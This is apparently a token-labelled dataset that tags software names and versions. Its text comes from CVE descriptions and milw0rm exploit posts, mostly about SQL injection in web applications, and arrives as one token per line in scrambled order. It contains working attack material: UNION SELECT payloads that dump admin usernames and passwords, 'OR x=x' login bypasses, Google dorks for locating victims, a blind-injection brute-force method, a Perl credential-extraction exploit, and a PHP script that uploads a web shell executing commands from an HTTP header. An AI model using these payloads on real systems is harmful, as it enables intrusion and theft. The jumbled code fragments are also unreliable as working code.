3 O
) O
Consider O
the O
following O
function O
which O
is O
called O
when O
Groupware O
is O
configured O
to O
use O
a O
PostgreSQL O
database O
server O
: O
int O
pgsqlQuery O
( O
CONN O
sid O
, O
int O
sqr O
, O
char O
sqlquery O
char O
query O
[ O
8192 O
memset O
( O
query O
, O
0 O
, O
sizeof O
( O
query O
) O
) O
; O
snprintf O
( O
query O
, O
sizeof O
( O
query O
) O
-1 O
, O
DECLARE O
myportal O
CURSOR O
FOR O
) O
; O
strncat O
( O
query O
, O
sqlquery O
, O
sizeof O
( O
query O
As O
you O
can O
see O
, O
it O
allocates O
a O
8192 O
byte O
buffer O
for O
query O
on O
the O
stack O
and O
proceeds O
to O
construct O
an O
SQL O
query O
. O

The O
developer O
was O
contacted O
on O
Monday O
, O
13th O
April O
2009 O
but O
no O
response O
was O
forthcoming O
. O

This O
can O
lead O
to O
SQL O
injection O
allowing O
compromise O
of O
the O
Groupware O
server O
. O

In O
theory O
this O
could O
lead O
to O
the O
previous O
functions O
base O
pointer O
( O
% O
ebp O
) O
and O
return O
address O
( O
% O
eip O
) O
being O
blown O
away O
if O
a O
the O
value O
of O
sqlquery O
passed O
is O
longer O
than O
8163 O
bytes O
. O

Solutions O
Unfortunately O
, O
Nth O
Dimension O
are O
unware O
of O
any O
fixes O
for O
these O
issues O
at O
the O
current O
time O
. O

For O
example O
, O
from O
the O
Groupware O
web O
application O
( O
which O
is O
typically O
found O
on O
port O
4110 O
) O
, O
the O
user O
is O
presented O
with O
a O
login O
page O
. O

Technical O
Details O
1 O
) O
Groupware O
typically O
calls O
the O
sql_queryf O
function O
when O
talking O
to O
the O
database O
server O
. O

High O
security O
hole O
in O
NullLogic O
Groupware O

SQL O
injection O
vulnerability O
in O
page.php O
in O
Your O
Articles O
Directory O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
id O
parameter O
. O

milw0rm.com O
[ O
2009-05-21 O
] O

Article O
Directory O
- O
page.php O
Blind O
SQL O
Injection O

SQL O
injection O
vulnerability O
in O
login.php O
in O
IT SN
! O
CMS SN
2.1a SV
and SV
earlier SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
Username O
. O

SQL O
Injection O
Vulnerability O
Discovered O
by O
: O
certaindeath O
[ O
+ O
] O
Exploit O
: O
simple O
SQL O
injection O
[ O
+ O
] O
Path O
: O
[ O
cms O
dir O
] O
/login.php O
[ O
+ O
] O
Username O
: O
OR O
x O
= O
x O
[ O
+ O
] O
Password O
: O
anything O
[ O
+ O
] O
Have O
fun O
^^ O
milw0rm.com O
[ O
2009-01-06 O
] O

Y O
IT O
! O
CMS O
< O
= O
vers O
. O

ItCMS SN
2.1a SV
- O
Authentication O
Bypass O

SQL O
injection O
vulnerability O
in O
joke.php O
in O
EasySiteNetwork O
Free O
Jokes O
Website O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
id O
parameter O
. O

IRANIN O
THE O
BEST O
HACKERS O
IN O
THE O
WORLD O
Remote O
SQL O
injection O
Vulnerability O
EasySiteNetwork O
( O
joke.php O
id O
) O
AuTh0r O
: O
Ehsan_hp200 O
H0ME O
: O
Email O
: O
Ehsan_Hp200 O
( O
at O
) O
Hotmail O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
VENDOR O
: O
Persian O
Gulf O
4 O
Ever O
! O

Dork O
: O
inurl O
: O
joke.php O
id= O
Powered O
by O
EasySiteNetwork O
Exploite O
: O
id=-1992+union+select+1 O
, O
concat O
( O
login,0x3a O
, O
passwo O
rd O
) O
,3,4,5,6,7,8+from+admin_login O
Admin O
Panel O
: O
, O
Special O
tanks O
to O
: O
All O
Parsi O
Hacker O
security O
Team O
members O
, O
SAHAND O
SHABAN O
, O
Dj7xpl O
, O
The.Mo3tafa O
, O
Jasoos O
Team O
, O
Enigma2 O
, O
IRANIN O
THE O
BEST O
HACKERS O
IN O
THE O
WORLD O

EasySiteNetwork O
( O
joke.php O
id O
) O
Remote O
SQL O
injection O
Vulnerability O

SQL O
injection O
vulnerability O
in O
the O
Swigmore SN
institute SN
( O
cgswigmore SN
) O
extension SN
before SV
0.1.2 SV
for O
TYPO3 O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
unspecified O
vectors O
. O

SQL O
injection O
vulnerability O
in O
index.cfm O
in O
CFMSource O
CFMBlog O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
categorynbr O
parameter O
. O

AlpHaNiX O
Found O
By O
: O
AlpHaNiX O
website O
: O
contact O
: O
AlpHa O
[ O
AT O
] O
HACKER O
[ O
DOT O
] O
BZ O
script O
: O
CFMBLOG O
download O
: O
null O
Demo O
BLIND O
SQL O
INJECTION O
] O
= O
milw0rm.com O
[ O
2008-12-10 O
] O

CFMBLOG O
- O
categorynbr O
Blind O
SQL O
Injection O

SQL O
injection O
vulnerability O
in O
track.php O
in O
Scripts O
For O
Sites O
( O
SFS O
) O
EZ O
BIZ O
PRO O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
id O
parameter O
. O

[ O
target O
] O
.com/Script/track.php O
id=-2+UNION+SELECT+concat O
( O
username,0x3e O
, O
password O
) O
+FROM+admin O
Deom O
Greetz O
All O
members O
of O
the O
Forum O
IQ-SecuritY O
WwW.IQ-ty.CoM O
| O
AnD O
TrYaG O
WwW.TrYaG.CC O
| O
| O
My O
friends O
: O
DeViL O
iRaQ O
| O
IRAQ O
DiveR O
| O
IRAQ_JAGUR O
| O
CraCkEr O
| O
| O
Ghost O
Hacker O
| O
FAHD O
| O
Iraqihack O
| O
jiko O
| O
str0ke O
| O
Cyber-Zone O
| O
Sakab O
| O
G4N0K O
| O
Im O
IRAQi O
| O
Im O
TrYaGi O
milw0rm.com O
[ O
2008-10-31 O
] O

| O
| O
| O
EZ O
BIZ O
PRO O
( O
track.php O
id O
) O
Remote O
SQL O
Injection O
Vulnerability O
IQ-SecuritY O
| O
| O
Author O
: O
Hussin O
X O
| O
| O
Home O
: O
WwW.IQ-ty.CoM O
| O
| O
email O
: O
darkangel_g85 O
[ O
at O
] O
Yahoo O
[ O
DoT O
] O
com O
script O
: O
DorK O
: O
inurl O
: O
track.php O
id= O
| O
Exploit O
www O
. O

SFS O
EZ O
BIZ O
PRO O
- O
SQL O
Injection O

SQL O
injection O
vulnerability O
in O
Tour.php O
in O
Pre O
Projects O
Pre O
Podcast O
Portal O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
id O
parameter O
. O

IN O
THE O
NAME O
OF O
ALLAH O
PRE O
PODCAST O
PORTAL O
( O
Tour.php O
id O
) O
SQL O
Injection O
Vulnerability O
Script O
: O
PRE O
PODCAST O
PORTAL O
[ O
~ O
] O
Language O
: O
PHP O
[ O
~ O
] O
Website O
[ O
main O
] O
: O
Website O
[ O
script O
] O
: O
Type O
: O
Commercial O
[ O
~ O
] O
Report-Date O
: O
05/11/2008 O
[ O
~ O
] O
Founder O
: O
G4N0K O
< O
mail.ganok O
[ O
at O
] O
gmail.com O
[ O
XPL O
] O
[ O
! O
] O

LIVE O
Greetz O
ALLAH O
[ O
~ O
] O
Tornado2800 O
< O
Tornado2800 O
[ O
at O
] O
gmail.com O
[ O
~ O
] O
Hussain-X O
< O
darkangel_g85 O
[ O
at O
] O
yahoo.com O
Are O
ya O
looking O
for O
something O
that O
has O
not O
BUGz O
at O
all O
... O
! O

I O
know O
it O
... O

[ O
: O
- O
) O
ALLAH O
, O
forgimme O
exit O
( O
) O
; O
EoX O
milw0rm.com O
[ O
2008-11-05 O
] O

It O
The O
Holy O
Quran O
. O

Pre O
Podcast O
Portal O
- O
SQL O
Injection O

SQL O
injection O
vulnerability O
in O
A4Desk O
PHP O
Event O
Calendar O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
eventid O
parameter O
to O
admin/index.php O
. O

SQL O
injection O
vulnerability O
in O
the O
eluna O
Page O

Comments SN
( O
eluna_pagecomments SN
) O
extension SN
1.1.2 SV
and SV
earlier SV
for O
TYPO3 O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
unspecified O
vectors O
. O

SQL O
injection O
vulnerability O
in O
urunler.asp O
in O
Iltaweb O
Alisveris O
Sistemi O
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
catno O
parameter O
. O

Note O
: O
No O
War.. O
! O

Author O
: O
By O
n O
xc3 O
xa9tRoot O
~ O
Contact O
: O
msn O
( O
at O
) O
passw0rd O
( O
dot O
) O
info O
[ O
email O
concealed O
] O
Greetz O
: O
BugBusters O
~ O
Thanx O
: O
Dumenci O
~ O
Sabneq O
~ O
LaqNes O
~ O
Neco O
~ O
MecTruy O
~ O
qopeLi O
... O

Script O
: O
xc4 O
xb0ltaweb O
Al O
xc4 O
xb1 O
xc5 O
x9fveri O
xc5 O
x9f O
Sistemi O
( O
tr O
) O
Sql O
inj O
Price O
: O
250 O
$ O
Dork O
: O
Powered O
by O
xc4 O
xb0LTAWEB O
Dork O
: O
urunler.asp O
catno O
Exploit O
: O
/urunler.asp O
catno=1 O
union O
select O
1,2,3,4,5,6,7,8,9,10,11,12,13 O
from O
users O

xc4 O
xb0ltaweb O
Al O
xc4 O
xb1 O
xc5 O
x9fveri O
xc5 O
x9f O
Sistemi O
( O
tr O
) O
Sql O
inj O

NOTE O
: O
some O
sources O
mention O
the O
escape_sqlData O
, O
implode_sql O
, O
and O
implode_sqlIn O
functions O
, O
but O
these O
are O
protection O
schemes O
, O
not O
the O
vulnerable O
functions O
. O

Multiple O
SQL O
injection O
vulnerabilities O
in O
Free SN
LAN SN
In SN
( O
tra|ter SN
) O
net SN
Portal SN
( O
FLIP SN
) O
before SV
1.0-RC3 SV
allow O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
unspecified O
vectors O
. O

NOTE O
: O
The O
provenance O
of O
this O
information O
is O
unknown O
; O
the O
details O
are O
obtained O
solely O
from O
third O
party O
information O
. O

SQL O
injection O
vulnerability O
in O
index.php O
in O
Eclectic SN
Designs SN
CascadianFAQ SN
4.1 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
qid O
parameter O
, O
a O
different O
vector O
than O
CVE-2007-0631 O
. O

SQL O
injection O
vulnerability O
in O
default.asp O
in O
ChernobiLe SN
1.0 SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
User O
( O
username O
) O
field O
. O

SQL O
] O
] O
] O
( O
POST O
Method O
) O
[ O
SQL O
] O
Example O
: O
Method O
: O
One O
Char O
Brute O
Force O
Technique O
First O
, O
Please O
Register O
Before O
: O
User O
: O
[ O
username O
] O
/and O
/ O
( O
substring O
( O
( O
SELECT O
/user_code O
/FROM O
/tblAuthor O
/WHERE O
/username= O
targetuser O
) O
,1,1 O
) O
) O
= O
A O
Pass O
: O
[ O
userpass O
] O
If O
Login O
True O
Then O
First O
Character O
= O
A O
elSe O
Continue O
SQL O
ajann O
, O
Turkey O
Im O
not O
Hacker O
! O

milw0rm.com O
[ O
2007-01-27 O
] O

Title O
: O
chernobiLe SN
Portal SN
1.0 SV
( O
default.asp O
) O
Remote O
SQL O
Injection O
Vulnerability O
Author O
: O
ajann O
Contact O
Not O
Free O
, O
Private O
Info O
: O
Turk O
Script O
Eklememen O
konusunda O
guzelce O
uyarmistim O
, O
ukalaca O
tamam O
demistin O
Fakat O
hala O
birsey O
bulmus O
gibi O
bazi O
sitelerde O
bu O
raporlarin O
basligini O
aciyorsun.Urastigin O
konuda O
bari O
acik O
birakma.Havani O
atmaya O
dvm O
et O
. O

chernobiLe SN
Portal SN
1.0 SV
- O
default.asp O
SQL O
Injection O

NOTE O
: O
a O
separate O
SQL O
injection O
issue O
could O
be O
leveraged O
to O
make O
this O
vulnerability O
reachable O
by O
remote O
unauthenticated O
attackers O
. O

Unrestricted O
file O
upload O
vulnerability O
in O
index.php O
in O
phpBP SN
RC3 SV
( O
2.204 SV
) O
and SV
earlier SV
allows O
remote O
administrators O
to O
inject O
arbitrary O
PHP O
code O
into O
an O
upload/banners O
file O
via O
a O
banners O
add O
operation O
that O
uploads O
the O
PHP O
code O
through O
an O
image_form O
parameter O
specifying O
a O
multiple-extension O
filename O
such O
as O
.jpg.vil.gif.php O
, O
which O
is O
stored O
in O
upload/banners O
under O
a O
different O
name O
, O
and O
executable O
via O
a O
direct O
request O
. O

proxy O
ock=fsockopen O
( O
$ O
parts O
, O
$ O
parts O
) O
; O
if O
( O
! O
$ O
ock O
) O
{ O
echo O
No O
response O
from O
proxy O
... O
; O
die O
; O
} O
} O
fputs O
( O
$ O
ock O
, O
$ O
packet O
) O
; O
if O
( O
$ O
proxy O
html O
while O
( O
! O
feof O
( O
$ O
ock O
) O
) O
{ O
$ O
html.=fgets O
( O
$ O
ock O
else O
{ O
$ O
html O
while O
( O
( O
! O
feof O
( O
$ O
ock O
) O
) O
or O
( O
! O
eregi O
( O
chr O
( O
0x0d O
) O
.chr O
( O
0x0a O
) O
.chr O
( O
0x0d O
) O
.chr O
( O
0x0a O
) O
, O
$ O
html O
html.=fread O
( O
$ O
ock,1 O
fclose O
( O
$ O
ock O
) O
; O
} O
function O
make_seed O
( O
) O
{ O
list O
( O
$ O
usec O
, O
$ O
sec O
) O
= O
explode O
microtime O
( O
) O
) O
; O
return O
( O
float O
) O
$ O
sec O
+ O
( O
( O
float O
) O
$ O
usec O
100000 O
) O
; O
} O
$ O
host= O
$ O
argv O
; O
$ O
path= O
$ O
argv O
; O
$ O
adsess= O
$ O
argv O
; O
$ O
cmd= O
; O
$ O
port=80 O
; O
$ O
proxy= O
; O
for O
( O
$ O
i=4 O
; O
$ O
i O
< O
$ O
argc O
; O
$ O
i++ O
) O
{ O
$ O
temp= O
$ O
argv O
[ O
$ O
i O
] O
. O
$ O
argv O
[ O
$ O
i O
] O
; O

. O
$ O
result O
; O
} O
$ O
proxy_regex O
= O
( O
b O
d O
{ O
1,3 O
} O
. O

; O
$ O
packet.= O
Connection O
: O
Close O
; O
sendpacket O
( O
$ O
packet O
) O
; O
$ O
temp=explode O
( O
< O
TD O
CLASS= O
row_1 O
ALIGN= O
CENTER O
> O
< O
A O
HREF= O
upload/banners O
, O
$ O
html O
) O
; O
$ O
temp2=explode O
( O
.php O
TARGET= O
_blank O
, O
$ O
temp O
) O
; O
$ O
uploadid=trim O
( O
$ O
temp2 O
) O
; O
if O
( O
$ O
uploadid O
) O
{ O
echo O
Step O
1 O
; O
echo O
Upload O
id O
: O
. O
$ O
uploadid O
. O

; O
$ O
packet O
= O
GET O
. O
$ O
p O
. O
upload/banners O
. O
$ O
uploadid O
. O

; O
$ O
packet.= O
Connection O
: O
Close O
; O
$ O
packet.= O
$ O
data O
; O
sendpacket O
( O
$ O
packet O
) O
; O
$ O
packet O
= O
GET O
. O
$ O
p O
. O

packet.= O
Content-Type O
: O
multipart/form-data O
; O
boundary= O
H4ck O
; O
$ O
packet.= O
Host O
: O
. O
$ O
host O
. O

i O
Find O
some O
errors O
in O
forum O
. O

index.php O
module=admin O
& O
action=banners O
HTTP/1.0 O
; O
$ O
packet.= O
Cookie O
: O
phpBP2= O
. O
$ O
adsess O
. O

milw0rm.com O
[ O
2007-01-18 O
] O

: O
. O
$ O
port O
; O
die O
; O
} O
} O
else O
{ O
$ O
c O
= O
preg_match O
( O
$ O
proxy_regex O
, O
$ O
proxy O
) O
; O
if O
( O
! O
$ O
c O
) O
{ O
echo O
Not O
a O
valid O
proxy O
... O
; O
die O
; O
} O
$ O
parts=explode O
proxy O
) O
; O
echo O
Connecting O
to O
. O
$ O
parts O
parts O
. O

; O
$ O
data O
= O
H4ck O
; O
$ O
data.= O
Content-Disposition O
: O
form-data O
; O
name= O
image_http O
data O
H4ck O
; O
$ O
data.= O
Content-Disposition O
: O
form-data O
; O
name= O
swf O
data.= O
0 O
; O
$ O
data O
= O
H4ck O
; O
$ O
data.= O
Content-Disposition O
: O
form-data O
; O
name= O
alt O
data.= O
0 O
; O
$ O
data O
= O
H4ck O
; O
$ O
data.= O
Content-Disposition O
: O
form-data O
; O
name= O
submit O
data.= O
Add O
; O
$ O
data.= O
H4ck O
; O
echo O
wait O
now O
insert O
evil O
code O
packet O
= O
POST O
. O
$ O
p O
. O

.php O
HTTP/1.0 O
; O
$ O
packet.= O
HAURU O
: O
. O
$ O
cmd O
. O

; O
echo O
... O
Go O
To O
DEVIL O
TEAM O
IRC O
: O
irc.milw0rm.com:6667 O
devilteam O
; O
echo O
... O
DEVIL O
TEAM O
SITE O
: O
Hauru O
; O
passthru O
( O
$ O
_SERVER O
[ O
HTTP_HAURU O
] O
) O
; O
die O
; O

d O
{ O
1,3 O
} O
. O

d O
{ O
1,3 O
} O
: O
d O
{ O
1,5 O
} O
b O
) O
; O
function O
sendpacket O
( O
$ O
packet O
) O
{ O
global O
$ O
proxy O
, O
$ O
host O
, O
$ O
port O
, O
$ O
html O
, O
$ O
proxy_regex O
; O
if O
( O
$ O
proxy O
ock=fsockopen O
( O
gethostbyname O
( O
$ O
host O
) O
, O
$ O
port O
) O
; O
if O
( O
! O
$ O
ock O
) O
{ O
echo O
No O
response O
from O
. O
$ O
host O
. O

; O
} O
else O
{ O
$ O
result O
string O
[ O
$ O
i O
] O
; O
} O
if O
( O
strlen O
( O
dechex O
( O
ord O
( O
$ O
string O
[ O
$ O
i O
] O
) O
) O
) O
2 O
) O
{ O
$ O
exa.= O
.dechex O
( O
ord O
( O
$ O
string O
[ O
$ O
i O
] O
) O
) O
; O
} O
else O
{ O
$ O
exa.= O
0 O
.dechex O
( O
ord O
( O
$ O
string O
[ O
$ O
i O
cont++ O
; O
if O
( O
$ O
cont O
15 O
) O
{ O
$ O
cont=0 O
; O
$ O
result O
exa O
return O
$ O
exa O
. O

packet.= O
Host O
: O
. O
$ O
host O
. O

; O
$ O
packet.= O
Host O
: O
. O
$ O
host O
. O

; O
$ O
packet.= O
Content-Length O
: O
.strlen O
( O
$ O
data O
) O
. O

; O
$ O
packet.= O
Connection O
: O
Close O
; O
$ O
packet.= O
$ O
data O
; O
sendpacket O
( O
$ O
packet O
) O
; O
sleep O
( O
1 O
) O
; O
} O
else O
{ O
echo O
exploit O
failed O
... O
can O
t O
upload O
script O
: O
; O
echo O
Go O
to O
DEVIL O
TEAM O
IRC O
: O
irc.milw0rm.com:6667 O
devilteam O
; O
die O
( O
Close O
Connection O
) O
; O
} O
if O
( O
strstr O
( O
$ O
html O
, O
Hauru O
temp=explode O
( O
Hauru O
, O
$ O
html O
) O
; O
die O
( O
$ O
temp O

Find O
by O
: O
Kacper O
( O
a.k.a O
Rahim O
) O
Blog O
: O
TEAM O
IRC O
: O
irc.milw0rm.com:6667 O
devilteam O
DEVIL O
TEAM O
HOME O
: O
kacper1964 O
@ O
yahoo.pl O
( O
c O
) O
od3d O
by O
Kacper O
Greetings O
DragonHeart O
and O
all O
DEVIL O
TEAM O
Patriots O
: O
) O
- O
Leito O
& O
Leon O
| O
friend O
str0ke O
; O
) O
pepi O
, O
D0han O
, O
d3m0n O
, O
D3m0n O
( O
ziom O
z O
Niemiec O
: O
P O
) O
dn0de O
, O
DUREK5 O
, O
fdj O
, O
konsol O
, O
mass O
, O
michalind O
, O
mIvus O
, O
nukedclx O
, O
QunZ O
, O
RebeL O
, O
SkD O
, O
Adam O
, O
drzewko O
, O
Leito O
, O
LEON O
, O
TomZen O
, O
dub1osu O
, O
ghost O
, O
WRB O
and O
Dr O
Max O
Virus O
TamTurk O
, O
hackersecurity.org O
and O
all O
exploit O
publishers O
Greetings O
for O
4ll O
Fusi0n O
Group O
members O
; O
- O
) O
and O
all O
members O
of O
hacker.com.pl O
Kacper O
Hacking O
& O
Security O
Blog O
: O
upload O
evil O
script O
when O
admin O
add O
new O
banner O
in O
portal O
. O

2.2.2.2 O
/phpBP O
d6c6cae3dfea20a0a5358fc9baff47be O
ls O
-la O
die O
; O
} O
error_reporting O
( O
0 O
) O
; O
ini_set O
( O
max_execution_time O
,0 O
) O
; O
ini_set O
( O
default_socket_timeout O
,5 O
) O
; O
function O
quick_dump O
( O
$ O
string O
) O
{ O
$ O
result O
exa O
cont=0 O
; O
for O
( O
$ O
i=0 O
; O
$ O
i O
< O
=strlen O
( O
$ O
string O
) O
-1 O
; O
$ O
i++ O
) O
{ O
if O
( O
( O
ord O
( O
$ O
string O
[ O
$ O
i O
] O
) O
< O
= O
32 O
) O
| O
( O
ord O
( O
$ O
string O
[ O
$ O
i O
] O
) O
126 O
) O
) O
{ O
$ O
result.= O
. O

index.php O
module=admin O
& O
action=banners O
& O
cmd=add O
HTTP/1.0 O
; O
$ O
packet.= O
Cookie O
: O
phpBP2= O
. O
$ O
adsess O
. O

phpBP SN
RC3 SV
( O
2.204 SV
) O
- O
SQL O
Injection O
Remote O
Code O
Execution O

SQL O
injection O
vulnerability O
in O
phpBP SN
RC3 SV
( O
2.204 SV
) O
and SV
earlier SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
comment O
forum O
. O

SQL O
injection O
vulnerability O
in O
email.php O
in O
MGB SN
OpenSource SN
Guestbook SN
0.5.4.5 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
id O
parameter O
. O

print O
Usage O
: O
$ O
0 O
[ O
HOST O
] O
[ O
PATH O
] O
; O
print O
Ex O
: O
$ O
0 O
/guestbook O
; O
print O
Ex O
: O
$ O
0 O
host.com O
mgb O
; O
print O
. O

` O
; O
exit O
( O
0 O
milw0rm.com O
[ O
2007-01-17 O
] O

! O
/usr/bin/perl O
MGB SN
< SV
= SV
0.5.4.5 SV
Exploit O
Vulnerability O
found O
by O
SlimTim10 O
Created O
By O
: O
SlimTim10 O
< O
slimtim10 O
@ O
gmail.com O
Google O
dork O
: O
( O
intext O
: O
mgb.0.5.. O
& O
intext O
: O
mopzz O
) O
| O
intext O
: O
mgb.0.5.4.. O
use O
IO O
: O
:Socket O
: O
:INET O
; O
usage O
( O
) O
unless O
( O
@ O
ARGV O
2 O
) O
; O
$ O
host O
= O
$ O
ARGV O
; O
$ O
dir O
= O
$ O
ARGV O
; O
$ O
dir O
dir O
if O
( O
$ O
dir O
dir O
= O
$ O
dir O
if O
( O
$ O
dir O
host O
=~ O
s/http O
: O
/g O
; O
$ O
path O
= O
$ O
dir O
. O

print O
q O
MGB SN
< SV
= SV
0.5.4.5 SV
Remote O
SQL O
Injection O
Exploit O
] O
[ O

Tested O
on O
MGB SN
< SV
= SV
0.5.4.5 SV
] O
[ O
Created O
by O
: O
SlimTim10 O
< O
slimtim10 O
@ O
gmail.com O
print O
x O
14 O
. O

email.php O
id=1 O
% O
20UNION O
% O
20SELECT O
% O
20null O
, O
passwort O
% O
20FROM O
% O
20mgb_settings O
% O
20 O
; O
$ O
socket O
= O
IO O
: O
:Socket O
: O
:INET- O
> O
new O
( O
Proto O
= O
tcp O
, O
PeerAddr O
= O
$ O
host O
, O
PeerPort O
= O
80 O
) O
|| O
die O
[ O
- O
] O
Connect O
Failed O
: O
could O
not O
connect O
to O
$ O
host O
; O
print O
[ O
+ O
] O
Connecting O
print O
$ O
socket O
GET O
$ O
path O
HTTP/1.1 O
; O
print O
$ O
socket O
Host O
: O
$ O
host O
; O
print O
$ O
socket O
Accept O
print O
$ O
socket O
Connection O
: O
close O
; O
print O
[ O
+ O
] O
Connected O
! O

`^ O
x O
29 O
. O

) O
& O
nbsp O
; O
schreiben O
and O
$ O
var O
= O
$ O
1 O
; O
} O
if O
( O
$ O
var O
da-f O
] O
{ O
32,32 O
} O
/ O
) O
{ O
print O
[ O
- O
] O
Exploit O
failed O
. O

; O
while O
( O
$ O
answer O
= O
< O
$ O
socket O
> O
) O
{ O
$ O
answer O
=~ O
m/Email O
an O
& O
nbsp O
; O
( O
. O

; O
exit O
( O
0 O
) O
; O
} O
print O
[ O
+ O
] O
Admin O
Password O
: O
$ O
var O
; O
print O
[ O
+ O
] O
Admin O
Link O
: O
usage O
{ O
print O
. O

x O
14 O
. O

MGB SN
0.5.4.5 SV
- O
email.php O
id O
SQL O
Injection O

SQL O
injection O
vulnerability O
in O
index.php O
( O
aka O
the O
login O
form O
) O
in O
Scriptme SN
SMe SN
FileMailer SN
1.21 SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
Password O
field O
( O
ps O
parameter O
) O
. O

Vendor O
URL O
Platform O
: O
Windows O
Linux O
Unix O
Bug O
type O
: O
sql O
injection O
Exploitation O
: O
Remote O
Author O
: O
CorryL O
~ O
corryl80 O
[ O
at O
] O
gmail O
[ O
dot O
] O
com O
Reference O
: O
Virtual O
Office O
Irc O
Chan O
: O
irc.darksin.net O
x0n3-h4ck O
Descriprion O
SMe O
FileMailer O
lets O
you O
require O
visitors O
to O
submit O
their O
name O
and O
email O
address O
in O
order O
to O
retrieve O
a O
file O
from O
your O
site O
. O

In O
the O
login O
form O
insert O
Login O
: O
admin O
Password O
: O
anything O
OR O
x O
= O
x O
Disclousure O
Timeline O
16/01/2007 O
] O
- O
Public O
disclousure O

This O
is O
a O
great O
way O
to O
stop O
leeching O
and O
third-party O
linking O
of O
your O
files O
, O
and O
it O
also O
lets O
you O
know O
exactly O
who O
obtaining O
your O
files O
! O

Upon O
submitting O
the O
information O
, O
the O
link O
for O
file O
is O
sent O
to O
the O
visitor O
via O
email O
. O

-= O
[ O
ADVISORY O
] O
=- O
SmE SN
FileMailer SN
1.21 SV
Author O
: O
CorryL O
[ O
corryl80 O
( O
at O
) O
gmail O
( O
dot O
) O
com O
[ O
email O
concealed O
Application O
: O
SmE O
FileMailer O
Version O
: O
1.21 O
-= O
[ O
+ O
] O

.. O
: O
: O
[ O
Proof O
Of O
Concept O
] O
: O
:.. O

[ O
x0n3-h4ck O
] O
SmE SN
FileMailer SN
1.21 SV
Remote O
Sql O
Injextion O
Exploit O

SQL O
injection O
vulnerability O
in O
visu_user.asp O
in O
Digiappz SN
DigiAffiliate SN
1.4 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
execute O
arbitrary O
SQL O
commands O
via O
the O
id O
parameter O
. O

> O
/ O
) O
{ O
print O
+ O
Name O
: O
$ O
1 O
; O
} O
if O
( O
$ O
answer O
=~ O
/name= O
email O
size= O
30 O
class= O
gray_back O
value O

onBlur/ O
) O
{ O
print O
+ O
Email O
: O
$ O
1 O
; O
} O
if O
( O
$ O
answer O
=~ O
/name= O
address1 O
size= O
30 O
class= O
gray_back O
value O

; O
print O
print O
+ O
Username O
: O
$ O
1 O
; O
} O
if O
( O
$ O
answer O
=~ O
/name= O
password O
size= O
30 O
class= O
gray_back O
value O

> O
/ O
) O
{ O
print O
+ O
PostCode O
: O
$ O
1 O
; O
} O
if O
( O
$ O
answer O
=~ O
/name= O
county O
size= O
30 O
class= O
gray_back O
value O

> O
/ O
) O
{ O
print O
+ O
Country O
: O
$ O
1 O
; O
} O
if O
( O
$ O
answer O
=~ O
/Syntax O
error/ O
) O
{ O
print O
+ O
Exploit O
Failed O
print O
exit O
( O
) O
; O
} O
if O
( O
$ O
answer O
=~ O
/Internal O
Server O
Error/ O
) O
{ O
print O
+ O
Exploit O
Failed O
print O
exit O
milw0rm.com O
[ O
2007-01-13 O
] O

> O
/ O
) O
{ O
print O
+ O
Fax O
: O
$ O
1 O
; O
} O
if O
( O
$ O
answer O
=~ O
/name= O
title O
size= O
30 O
class= O
gray_back O
value O

Getting O
admin O
information O
. O

; O
Getting O
while O
( O
$ O
answer O
= O
< O
$ O
socket O
> O
) O
{ O
if O
( O
$ O
answer O
=~ O
/name= O
login O
size= O
30 O
class= O
gray_back O
value O

! O
/usr/bin/perl O
[ O
Script O
Name O
: O
DigiAffiliate O
< O
= O
V1.4 O
Remote O
Blind O
SQL O
Injection O
Exploit O
[ O
Coded O
by O
: O
ajann O
[ O
Author O
: O
ajann O
[ O
Contact O
S.Page O
: O
: O
.299 O
ajann O
, O
Turkey O
use O
IO O
: O
:Socket O
; O
if O
( O
@ O
ARGV O
< O
1 O
) O
{ O
print O
DigiAffiliate O
< O
= O
V1.4 O
Remote O
Blind O
SQL O
Injection O
Exploit O
[ O
Usage O
: O
exploit.pl O
[ O
target O
] O
[ O
Example O
: O
exploit.pl O
victim.com O
[ O
Example O
: O
exploit.pl O
victim.com O
[ O
Vuln O
& O
Exp O
: O
ajann O
[ O
; O
exit O
Local O
variables O
$ O
server O
= O
$ O
ARGV O
; O
$ O
server O
=~ O
s/ O
( O
http O
: O
/ O
) O
eg O
; O
$ O
host O
80 O
; O
$ O
file O
= O
/visu_user.asp O
id= O
; O
print O
Script O
< O
DIR O
dir O
= O
< O
STDIN O
> O
; O
chop O
( O
$ O
dir O
) O
; O
if O
( O
$ O
dir O
=~ O
/exit/ O
) O
{ O
print O
Exploit O
Failed O
[ O
You O
Are O
Exited O
] O
; O
exit O
( O
) O
; O
} O
if O
( O
$ O
dir O
else O
{ O
print O
Exploit O
Failed O
[ O
No O
DIR O
] O
; O
exit O
target O
= O
-1 O
% O
20union O
% O
20select O
% O
200 O
, O
login O
, O
password O
, O
name O
, O
email,0 O
, O
fax O
, O
city,0 O
, O
address1 O
, O
address2 O
, O
phone,0,0,0,0 O
, O
city,0,0 O
% O
20from O
% O
20members O
; O

> O
/ O
) O
{ O
print O
+ O
Password O
: O
$ O
1 O
; O
} O
if O
( O
$ O
answer O
=~ O
/name= O
name O
size= O
30 O
class= O
gray_back O
value O

> O
/ O
) O
{ O
print O
+ O
City O
: O
$ O
1 O
; O
} O
if O
( O
$ O
answer O
=~ O
